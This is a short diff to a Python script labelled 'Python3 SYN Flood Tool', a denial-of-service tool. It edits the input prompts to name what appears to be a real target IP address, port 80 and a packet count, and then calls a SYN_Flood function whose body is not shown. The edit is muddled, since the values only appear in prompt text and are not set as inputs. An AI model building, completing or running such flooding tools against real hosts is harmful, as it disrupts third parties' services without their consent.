@@ -52,15 +52,15 @@ def info():
 	print ("# Welcome to Python3 SYN Flood Tool #")
 	print ("#####################################")
 
-	dstIP = input ("\nTarget IP : ")
-	dstPort = input ("Target Port : ")
+	dstIP = input ("\nTarget IP :193.210.161.84 ")
+	dstPort = input ("Target Port :80 ")
 
 	return dstIP,int(dstPort)
 
 
 def main():
 	dstIP,dstPort = info()
-	counter = input ("How many packets do you want to send : ")
+	counter = input ("How many packets do you want to send :124 ")
 	SYN_Flood(dstIP,dstPort,int(counter))
 
 main()
